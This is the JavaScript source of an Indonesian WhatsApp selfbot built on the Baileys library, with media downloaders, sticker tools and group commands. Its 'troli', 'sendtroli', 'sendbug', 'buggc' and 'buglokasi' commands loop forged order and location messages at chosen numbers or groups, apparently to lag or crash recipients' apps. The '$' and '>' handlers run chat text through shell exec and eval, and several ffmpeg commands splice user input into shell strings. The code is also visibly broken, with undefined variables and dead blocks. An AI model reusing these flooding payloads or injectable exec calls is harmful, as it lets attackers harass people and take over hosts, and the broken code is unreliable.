




//MODULE
const {
WAConnection: _WAConnection,
MessageType,
Presence,
MessageOptions,
Mimetype,
MimetypeMap,
WALocationMessage,
WA_MESSAGE_STUB_TYPES,
ReconnectMode,
ProxyAgent,
GroupSettingChange,
ChatModification,
waChatKey,
mentionedJid,
WA_DEFAULT_EPHEMERAL
} = require("@adiwajshing/baileys")
const simple = require('./data/js/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const { 
generateMessageID,
getGroupAdmins,
getRandom,
banner,
start,
success,
info
} = require('./data/js/functions.js')
const { 
color, 
bgcolor 
} = require('./data/js/color.js')
const {
spawn,
exec,
execSync 
} = require('child_process')
const qrcode = require('qrcode-terminal')
const moment = require('moment-timezone')
const fs = require('fs')
const figlet = require('figlet')
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ytdl = require( 'ytdl-core')
const fetch = require('node-fetch')
const ggs = require('google-it')
const googleImage = require('g-i-s')
const axios = require('axios')
const CFonts = require('cfonts')
const oes = require('os')
const request = require ('request')
const got = require('got')
const cheerio = require('cheerio')
const formData = require('form-data')
const dl = require('./scraper.js')
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const phoneNumber = require('awesome-phonenumber')
const commandsDB = JSON.parse(fs.readFileSync('.data/src/commands.json'));
const { addCommands, checkCommands, deleteCommands } = require('.data/js/autoresp')
const imgbb = require('imgbb-uploader')
const os = require('os')
const jam = moment.tz('Asia/Jakarta').format('HH:mm')
//END MODULE


//METADATA
isPublic = false
isOff = true
isAntidelete = false
prefix = '#'
alasan = ''
charging = ''
battrei = ''
thumb = fs.readFileSync(`./data/src/thumb/Ivan.jpg`)
uptime = process.uptime()
waktuof = process.uptime()
blocking = []
//END METADATA


//FUNCTION DATE
var ucapan = 'Hay Spnb'
 if (jam >= '04:00' && jam <= '06:00') {
 ucapanW = 'Subuh!'
 } else if (jam >= '06:00' && jam <= '10:00') {
 ucapanW = 'Pagi!'
 } else if (jam >= '10:00' && jam <= '14:00') {
 ucapanW = 'Siang!'
 } else if (jam >= '14:00' && jam <= '17:00') {
 ucapanW = 'Sorre!'
 } else if (jam >= '17:00' && jam <= '17:30') {
 ucapanW = 'Petang!'
 } else if (jam >= '17:30' && jam <= '18:10') {
 ucapanW = 'Magrib!'
 } else if (jam >= '18:10' && jam <= '04:00') {
 ucapanW = 'Malam!'
 } else {
 ucapanW = 'Malam!'
 }
function formatDate(n, locale = 'id') {
let d = new Date(n)
return d.toLocaleDateString(locale, {
weekday: 'long',
day: 'numeric',
month: 'long',
year: 'numeric',
hour: 'numeric',
minute: 'numeric',
second: 'numeric'
})
}
const d = new Date
const locale = 'id'
const gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString(locale, { weekday: 'long' })
const calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
function kyun(seconds) {
function pad(s) {
return (s < 10 ? '0' : '') + s
}
var hours = Math.floor(seconds / (60 * 60))
var minutes = Math.floor(seconds % (60 * 60) / 60)
var seconds = Math.floor(seconds % 60)
return `${pad(hours)}:${pad(minutes)}:${pad(seconds)}`
}
//END FJNCTION DATE


//FUNCTION CONNECT
async function starts() {
const vanz = new WAConnection()
vanz.version = [2, 2119, 6]
vanz.logger.level = 'warn'
vanz.on('qr', qr => {
qrcode.generate(qr, { small: true })
console.log(color('[','white'), color('!','red'), color(']','white'), color('Self Ivanzz','yellow'))
})
vanz.on('credentials-updated', () => {
fs.writeFileSync('./qr.json', JSON.stringify(vanz.base64EncodedAuthInfo(), null, '\t'))
info('2', 'Loading')
})
fs.existsSync('./qr.json') && vanz.loadAuthInfo('./qr.json')
vanz.on('connecting', () => {
start('2', 'Connecting')
})
vanz.on('open', () => {
success('2', 'Connected ')
})
vanz.connect({timeoutMs: 301000})

vanz.on('CB:Blocklist', json => {
if (blocking.length > 2) return
for (let i of json[1].blocklist) {
blocking.push(i.replace('c.us', 's.whatsapp.net'))
}
})
vanz.on('CB:action,,battery', json => {
global.batteryLevelStr = json[2][0][1].value
global.batterylevel = parseInt(batteryLevelStr)
baterai = batterylevel
if (json[2][0][1].live == 'true') charging = true
if (json[2][0][1].live == 'false') charging = false
})
vanz.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (m.key.fromMe) return
const moment = require('moment-timezone')
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
vanz.sendMessage(m.key.remoteJid, `ANTI DELETE
Nama : @${m.participant.split("@")[0]}
Waktu : ${jam} ${week} ${calender}`, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
vanz.copyNForward(m.key.remoteJid, m.message)
})
vanz.on('chat-update', async(vnz) => {
try {
if (!vnz.hasNewMessage) return
vnz = vnz.messages.all()[0]
if (!vnz.message) return
if (vnz.key && vnz.key.remoteJid == 'status@broadcast') return
vnz.message = (Object.keys(vnz.message)[0] === 'ephemeralMessage') ? vnz.message.ephemeralMessage.message : vnz.message
if(vnz.key.fromMe){
}
if (!isPublic) {
if (!vnz.key.fromMe) return
}
m = simple.smsg(vanz, vnz)
global.prefix
global.blocking
global.nana
if (m.isBaileys === true) return
vnz.message = (Object.keys(vnz.message)[0] === 'ephemeralMessage') ? vnz.message.ephemeralMessage.message : vnz.message
global.batrei = global.batrei ? global.batrei : []
vanz.on('CB:action,,battery', json => {
const batteryLevelStr = json[2][0][1].value
const batterylevel = parseInt(batteryLevelStr)
global.batrei.push(batterylevel)
})
res = global.batrei[global.batrei.length - 1]
battrey = []
batrai = res + charging ? '⚡' : ''
cas = charging ? 'true' : 'false'
battrey.push({batrai,cas})
var tampilan_battrey = `Belum Terdeteksi`
if (battrey >= '0' && battrey <= '10') {
tampilan_battrey = `${battrey}% [▓▒▒▒▒▒▒▒▒▒]`
} else if (battrey >= '10' && battrey <= '20') {
tampilan_battrey = `${battrey}% [▓▓▒▒▒▒▒▒▒▒▒]`
} else if (battrey >= '20' && battrey <= '30') {
tampilan_battrey = `${battrey}% [▓▓▓▒▒▒▒▒▒▒]`
} else if (battrey >= '30' && battrey <= '40') {
tampilan_battrey = `${battrey}% [▓▓▓▓▒▒▒▒▒▒]`
} else if (battrey >= '40' && battrey <= '50') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▒▒▒▒▒]`
} else if (battrey >= '50' && battrey <= '60') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▓▒▒▒▒]`
} else if (battrey >= '60' && battrey <= '70') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▓▓▒▒▒]`
} else if (battrey >= '70' && battrey <= '80') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▓▓▓▒▒]`
} else if (battrey >= '80' && battrey <= '90') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▓▓▓▓▒]`
} else if (battrey >= '90' && battrey <= '100') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▓▓▓▓▓]`
} else {
}
const content = JSON.stringify(vnz.message)
const from = vnz.key.remoteJid
const type = Object.keys(vnz.message)[0]
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
const multi = (type === 'conversation' && vnz.message.conversation) ? vnz.message.conversation : (type == 'imageMessage') && vnz.message.imageMessage.caption ? vnz.message.imageMessage.caption : (type == 'videoMessage') && vnz.message.videoMessage.caption ? vnz.message.videoMessage.caption : (type == 'extendedTextMessage') && vnz.message.extendedTextMessage.text ? vnz.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(multi) ? multi.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '-'
body = (type === 'conversation' && vnz.message.conversation.startsWith(prefix)) ? vnz.message.conversation : (type == 'imageMessage') && vnz.message.imageMessage.caption.startsWith(prefix) ? vnz.message.imageMessage.caption : (type == 'videoMessage') && vnz.message.videoMessage.caption.startsWith(prefix) ? vnz.message.videoMessage.caption : (type == 'extendedTextMessage') && vnz.message.extendedTextMessage.text.startsWith(prefix) ? vnz.message.extendedTextMessage.text : ''
bodi = (type === 'conversation') ? vnz.message.conversation : (type === 'extendedTextMessage') ? vnz.message.extendedTextMessage.text : ''
const tohex = Object.keys(vnz.message)[0] == "stickerMessage" ? vnz.message.stickerMessage.fileSha256.toString('hex') : ""
isStc = tohex
const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
isStc !== "" && content.includes("conversation")
const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
const isStcVideo = isStcMedia && content.includes("videoMessage")
const isStcImage = isStcMedia && content.includes("imageMessage")
const isStcSticker = isStcMedia && content.includes("stickerMessage")
const isStcTeks = isStcMedia && content.includes("quotedMessage")
const isStcDocs = isStcMedia && content.includes("documentMessage")
const isStcContact = isStcMedia && content.includes("contactMessage")
const isStcAudio = isStcMedia && content.includes("audioMessage")
const isStcLoca = isStcMedia && content.includes("locationMessage")
const isStcTag = isStcMedia && content.includes("mentionedJid")
const isStcReply = isStcMedia && content.includes("Message")
const isStcProd = isStcMedia && content.includes("productMessage")
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
mess = {
wait: '*⏳Wait sedang di prosess...*',
sukses: '*Sukses Bosku !!*',
error: '*Error!!*'
}
const ownerNumber = '62895386763040@s.whatsapp.net'
const isGroup = from.endsWith('@g.us')
const sender = isGroup ? vnz.sender : vnz.key.remoteJid
const totalchat = await vanz.chats.all()
const groupMetadata = isGroup ? await vanz.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const conts = vnz.key.fromMe ? vanz.user.jid : vanz.contacts[sender] || { notify: jid.replace(/@.+/, '') }
const pushname = vnz.key.fromMe ? vanz.user.name : conts.notify || conts.vname || conts.name || '-'
const q = args.join(' ')
const reply = (teks) => {
vanz.sendMessage(from, `${teks}`, text, {quoted:vnz})
}
const math = (teks) => {
return Math.floor(teks)
}
const sendIMG = (to, res) => {
vanz.sendMessage(from, res, image, {quoted:vnz, caption: caption, thumbnail:thumb})
}
const sendSTC = (to, res) => {
vanz.sendMessage(to, res, sticker, {quoted:vnz})
}
const sendVID = (to, res) => {
vanz.sendMessage(to, res, video, {mimetype: 'video/mp4', quoted:vnz, caption:caption})
}
const sentTXT = (to, res) => {
vanz.sendMessage(to, res, text)
}
const sendPTT = (res) => {
vanz.sendMessage(from, res, audio, {mimetype: 'audio/mp4', ptt:true, quoted:vnz})
}
const sendStickUrl = async(from, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './data/sampah/' + names + '.png', async function () {
console.log('selesai');
let filess = './data/sampah/' + names + '.png'
let asw = './data/sampah/' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
vanz.sendMessage(to, media, MessageType.sticker,{quoted:vnz})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}
if (body.startsWith('$')) {
if (!vnz.key.fromMe) return
exec(q, (err, stdout) => {
if(err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (body.startsWith('<')) {
if (!vnz.key.fromMe) return
try {
return vanz.sendMessage(from, JSON.stringify(eval(`${args.join(' ')}`),null,'\t'),text, {quoted: vnz})
} catch (e) {
reply(e)
}
}
if (body.startsWith('>')) {
if (!vnz.key.fromMe) return
try {
function Res(res) {
ev = JSON.stringify(res, null, 2)
al = util.format(ev)
if (ev == undefined){
al = util.format(ev)
}
return reply(`${al}`)
}
reply(util.format(eval(`(async () => { ${q} })()`)))
} catch(e) {
emror = String(e)
reply(`${emror}`)
}
}
const sendFile = async(link, type, options) => {
hasil = await getBuffer(link)
vanz.sendMessage(from, hasil, type, options).catch(e => {
fetchh(link).then((hasil) => {
vanz.sendMessage(from, hasil, type, options).catch(e => {
vanz.sendMessage(from, { url : link }, type, options).catch(e => {
reply('Error!')
console.log(e)
})
})
})
})
}
if (m.message && m.key.fromMe && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
reply('Njir Troli 🗿\n\n' + require('util').format(m.key))
await vanz.modifyChat(m.chat, 'delete', {
 includeStarred: false
})
}
offlen = `${kyun(waktuof)}`
if (!vnz.key.fromMe && isGroup && off == false) {
if (bodi.includes(`@${ownerNumber}`)) {
vanz.sendMessage(from, `* Mohon Maaf @${ownerNumber.split('@')[0]} Sedang Offline!*
*• Alasan:* ${reason}
*• Sejak:* ${offlen}`, text, {quoted:vnz, contextInfo: { mentionedJid: [ownerNumber]}})
}
}
for (var i = 0; i < commandsDB.length ; i++) {
				if (budy.toLowerCase() === commandsDB[i].pesan) {
					reply(`${commandsDB[i].balasan}`)
				}
			}
const fakeinvite = {
"key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": '6285737134572-1612303415@g.us',
"inviteCode": "mememteeeekkeke",
"groupName": from, 
"caption": `:${prefix + command}`, 
'jpegThumbnail': thumb
}
}
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? vanz.sendMessage(from, teks.trim(), extendedText, { contextInfo: { 'mentionedJid': memberr } }) : vanz.sendMessage(from, teks.trim(), extendedText, { quoted:vnz, contextInfo: { 'mentionedJid': memberr } })
}

module.exports = getBuffer = async (url, options) => {
options ? options : {}
 res = await axios({
method: "get",
url,
headers: {
'DNT': 1,
'Upgrade-Insecure-Request': 1
},
...options,
responseType: 'arraybuffer'
})
return res.data
}
module.exports = exif = (packname, authorname, filename) => {
if (!filename) filename = 'data'
 json = {
'sticker-pack-id': 'com.snowcorp.stickerly.android.stickercontentprovider b5e7275f-f1de-4137-961f-57becfad34f2',
'sticker-pack-name': paackname,
'sticker-pack-publisher': authorname,
'android-app-store-link': 'https://play.google.com/store/apps/details?id=com.pubg.newstate&hl=in&gl=US',
'ios-app-store-link': 'https://apps.apple.com/us/app/pubg-mobile-3rd-anniversary/id1330123889'
}
let len = JSON.stringify(json).length
const f = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
const code = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]
if (len > 256) {
len = len - 256
code.unshift(0x01)
} else {
code.unshift(0x00)
}
const fff = Buffer.from(code)
const ffff = Buffer.from(JSON.stringify(json))
if (len < 16) {
len = len.toString(16)
len = '0' + len
} else {
len = len.toString(16)
}
const ff = Buffer.from(len, 'hex')
const buffer = Buffer.concat([f, ff, fff, ffff])
fs.writeFile(`./data/sampah/${filename}.exif`, buffer, (err) => {
if (err) return console.error(err)
console.log('Success!')
})
}

function troli(nomor){
vanz.sendMessage(nomor, `Punten !!!`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
 },
message: {
orderMessage: {
itemCount: 999999999, 
status: 1,
surface: 10,
orderTitle: 'TROLI', 
sellerJid: '0@s.whatsapp.net'
}
}
}
})
}

colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
let waktu = moment.tz('Asia/Jakarta').format('MM/DD HH:mm')
if (!isCmd) console.log(color('\x1b[1;37m>', 'cyan'), color('[MSG]'), color(waktu, 'cyan'), color('Message', 'red'), 'Dari', color(pushname))
if (isCmd) console.log(color('\x1b[1;37m>', 'cyan'), color('[CMD]'), color(waktu, 'cyan'), color(command + ` [${[args.length]}]` ), 'Dari', color(pushname))

switch (command) {
case 'menu':
case 'h':
 case 'help':
menu = ` *SIMPEL-SELFBOT*

*INFO*
• ${prefix}stats
• ${prefix}runtime
• ${prefix}owner
• ${prefix}speed
• ${prefix}listgroup
• ${prefix}uptime

*Downloader*
• ${prefix}ytmp3 *link*
• ${prefix}ytmp4 *link*
• ${prefix}play *query*
• ${prefix}playmp4 *query*
• ${prefix}fb *link*
• ${prefix}tiktok *link*
• ${prefix}tiktokmusic *link*
• ${prefix}ig *link*

*Stalker*
• ${prefix}igstalk *username*
• ${prefix}ghstalk *username*

*Converter*
• ${prefix}stiker 
• ${prefix}swm nama|author
• ${prefix}take nama|author
• ${prefix}colong
• ${prefix}tomp3
• ${prefix}toimg

*Maker*
• ${prefix}tahta *txt*
• ${prefix}textstyle *txt*

*Group*
• ${prefix}grup *buka/tutup*
• ${prefix}setgcname *txt*
• ${prefix}setgcdesk *txt*
• ${prefix}add *628xx*
• ${prefix}kick *@tag/reply*
• ${prefix}getpic *@tag*
• ${prefix}promote 
• ${prefix}demote 
• ${prefix}hidetag *txt*
• ${prefix}tagall 

*Voice Changer*
• ${prefix}bass *jml*
• ${prefix}tempo *jml*
• ${prefix}vibra *jml*
• ${prefix}trigger 
• ${prefix}balik
• ${prefix}volume *jml*
• ${prefix}hode 
• ${prefix}robot
• ${prefix}budeg


*Owner*
• ${prefix}welcome *1/0*
• ${prefix}join *link*
• ${prefix}bc *txt*
• ${prefix}shutdown
• ${prefix}restart 
• ${prefix}inspect *link gc*
• ${prefix}caripesan *jml*
• > *eval*
• $ *exec*`

res = await vanz.prepareMessageFromContent(from,{
"orderMessage": {
"orderId": '155157279766079',
"itemCount": '2021',
"status": 'INQUIRY',
"surface":'CATALOG',
"message": menu,
"thumbnail": thumb,
"orderTitle": 'SPNb',
"sellerJid": '0@s.whatsapp.net',
"token": 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g=='
}
}, 
 {quoted:vnz, contextInfo:{}}) 
vanz.relayWAMessage(res)
break
				case 'addrespon':
if (args.length < 1) return reply(`Penggunaan ${prefix}addrespon hai|hai juga`)
arg = args.join(' ')
argz = arg.split('|')
if (checkCommands(argz[0], commandsDB) === true) return reply(`Udah ada`)
addCommands(argz[0], argz[1], sender, commandsDB)
reply(`Ok berhasil gan`)
break
case 'delrespon':
if (args.length < 1) return reply(`Penggunaan ${prefix}delrespon hai`)
if (!checkCommands(args.join(' '), commandsDB)) return reply(`Ga ada di database`)
deleteCommands(args.join(' '), commandsDB)
reply(`Sucess`)
break
case 'stats':
 reply(mess.wait)
var groups = vanz.chats.array.filter(v => v.jid.endsWith('g.us'))
var privat = vanz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
uptime = process.uptime();
timestamp = speed();
totalChat = await vanz.chats.all()
charge = charging ? 'true' : 'false'
listrik = charging ? '⚡' : ''
latensi = speed() - timestamp
var total = math(`${groups.length}*${privat.length}`)
teks = `*Bot Stats*
• Group Chats : ${groups.length}
• Private Chats : ${privat.length}
• Total Chats : ${totalChat.length}
• Speed : ${latensi.toFixed(4)} Second
• Runtime : ${kyun(uptime)}

*Phone Stats*
• Baterai : ${JSON.stringify(baterai)}%${listrik}
• Penggunaan Ram : ${ram2}
• Platform : ${os.platform()}
• Hostname : ${os.hostname()}
• Uptime : ${kyun(os.uptime())}
• Wa Version: ${vanz.user.phone.wa_version}
• Os Version: ${vanz.user.phone.os_version}
• Device Model: ${vanz.user.phone.device_model}`
reply(`${teks}`)
break
//********** UPLOAD **********
case 'upswtext':
  if (!vnz.key.fromMe) return ephe('*Ente owner?*')
  q = args.join(" ")
					vanz.updatePresence(from, Presence.composing)
					vanz.sendMessage('status@broadcast', `${q}`, extendedText)
					vanz.sendMessage(from, `Sukses Up story wea teks *${q}*`, text,{quoted : ftoko})
					break
					
				case 'upswimg':
					vanz.updatePresence(from, Presence.composing)
					q = args.join(" ")
					if (isQuotedImage) {
						const swsw = isQuotedImage ? JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vnz
						cihcih = await vanz.downloadMediaMessage(swsw)
						vanz.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Image dengan Caption: ${q}`
					vanz.sendMessage(from, bur, text, { quoted: ftoko })
					break
					
				case 'upswvideo':
				  if (!vnz.key.fromMe) return ephe('*Ente owner?*')
					vanz.updatePresence(from, Presence.composing)
					q = args.join(" ")
					if (isQuotedVideo) {
						const swsw = isQuotedVideo ? JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vnz
						cihcih = await vanz.downloadMediaMessage(swsw)
						vanz.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` })
					}
					bur = `Sukses Upload Story Video dengan Caption: ${q}`
					vanz.sendMessage(from, bur, text, { quoted: ftoko })
					break
case 'balik':
 reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break
case 'volume':
 reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break
case 'budeg':
 reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "volume=30" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break
case 'imut': 
 reply(mess.wait)
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break
anu = from
if (`${anu}@g.us`) {
try {
ppimg = await vanz.getProfilePicture(anu)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
metadete = await vanz.groupMetadata(anu)
ano = await vanz.getProfilePicture(anu)
buffer = await getBuffer(ano)
vanz.sendMessage(from, buffer, image, {quoted: floc, caption: `Done!!`})
} else {
}
break
case 'getpic':
 reply(mess.wait)
pp = await vanz.getProfilePicture(vnz.quoted.participans)
sendFile(pp, image,{thumbnail:thumb})
break
case 'getmusic': case 'getytmusic':
 reply(mess.wait)
namLagu = 'Y'
ffmpeg(q)
.audioBitrate(320)
.save('./data/sampah/' + namLagu + '.mp3')
.on('end', async () => {
saveMedia = new ID3Writer(fs.readFileSync('./data/sampah/' + namLagu + '.mp3'));
await vanz.sendMessage(from, Buffer.from(saveMedia.arrayBuffer), audio, {mimetype: Mimetype.mp4Audio, ptt: true, quoted: vnz});
fs.unlinkSync('./data/sampah/' + namLagu + '.mp3')
});
break
case 'play': case 'ytplay': case 'ytmp3':
 reply(mess.wait)
 ytsnya = await yts(q);
res = ytsnya.all;
anu = await dl.yta(res[0].url)
bup = await getBuffer(anu.audio)
vanz.sendMessage(from, bup, audio, {mimetype: 'audio/mp4', quoted:vnz})
break
case 'video': case 'playmp4': 
 ytsnya = await yts(q);
res = ytsnya.all;
anu = await dl.ytv(res[0].url)
bup = await getBuffer(anu.dl_link)
vanz.sendMessage(from, bup, video, {quoted:vnz})
break
case 'offline':
if (args.length < 1) return reply('Alasanya apa?')
if (off === false) return
off = false
reason = q
waktuoff = `${jam}`
vanz.sendMessage(from, `* OFFLINE*
*• Alasan :* ${reason}
*• Waktu :* ${waktuoff}`, text, { contextInfo: {mentionedJid: [sender]}, quoted:vnz})
break
case 'sendbug': case 'sendbuggc':
hm = `${q}`
hmm = hm.split("|")[0];
hmmm = hm.split("|")[1];
for (let i = 0; i < hmmm; i++) {
await vanz.toggleDisappearingMessages(hmm, 0)
reply(`Sukses SendBuggc ke ${hm}`)
}
break
case 'buggc':
for (let i = 0; i < args[0]; i++) {
await vanz.toggleDisappearingMessages(from, 0)
reply(`Sukses SendBugg`)
}
break
case 'buglokasi':
vanz.sendMessage(from, {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:'Troli By Ivanzz',address:'Puntenn !!'}, MessageType.location, {quoted:BugTroli})
break
case 'sendtroli':
hm = `${q}`
hmm = hm.split("|")[0];
hmmm = hm.split("|")[1];
for (let i = 0; i < hmmm; i++) {
await troli(hmm + '@s.whatsapp.net', 0)
}
reply(`Sukses Send Troli ke ${mhm}`)
break
case 'troli':
for (let i = 0; i < args[0]; i++) {
troli(from, 0)
}
reply('Sukses')
break
case 'online':
bacChat = true
reply('Online')
break
case 'mediafire': case 'mfire':
 reply(mess.wait)
 query = await axios.get(q) 
cher = cheerio.load(query.data)
 hasil = []
 link = cher('a#downloadButton').attr('href')
size = cher('a#downloadButton').text().replace('Download', '').replace('(', '').replace(')', '').replace('\n', '').replace('\n', '').replace(' ', '')
 split = link.split('/')
 aurhor = 'Ivanzz'
 nama = seplit[5]
 mime = nama.split('.')
mime = mime[1]
hasil.push({ author, nama, mime, size, link })
return hasil
sendFile(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: vnz})
break
case 'yts': case 'ytsearch':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = q
reply(mess.wait)
res = await yts(`${teks}`)
kant = ``
for (let i of res.all) {
kant += `* Yt Search*
*• Judul :* ${i.title}
*• Views :* ${i.views}
*• Di Upload Pada :* ${i.ago}
*• Durasi :* ${i.timestamp}
*• Channel :* ${i.author.name}
*• Link Channel :* ${i.author.url}
*• Link Video :* ${i.url}
`
}
var akhir = kant.trim()
sendFile(res.all[0].image, image, {quoted: vnz, caption: akhir})
break
case 'tinyurl': case 'shorturl':
 reply(mess.wait)
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${q}`)
reply(anu.data)
break
case 'tomp3':
 reply(mess.wait)
vanz.updatePresence(from, Presence.composing)
if (!isQuotedVideo) return reply('Itu bukan video')
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(mess.error)
buffer = fs.readFileSync(ran)
vanz.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4'})
fs.unlinkSync(ran)
})
break
case 'tg':
 reply(mess.wait)
var imgbb = require('imgbb-uploader')
ted = isQuotedImage ? JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: vnz
owgi = await vanz.downloadAndSaveMediaMessage(ted)
anu = await imgbb(`a1cb3ed24455dbb63fbd23cee996aa47`, owgi)
hedhe = await getBuffer(`https://pecundang.herokuapp.com/api/triggeredwebp?url=${anu.display_url}`)
vanz.sendSTC(hedhe)
break
case 'batrai': case 'battrey':
reply(battrey)
break
case 'bass': 
 reply(mess.wait)
req = q
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await vanz.downloadAndSaveMediaMessage(encmedia)
random = getRandom('.mp3')
exec(`ffmpeg -i ${media} -af equalizer=f=${req}:width_type=o:width=2:g=20 ${random}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(random)
sendPTT(res)
fs.unlinkSync(random)
})
break
case 'vibra':
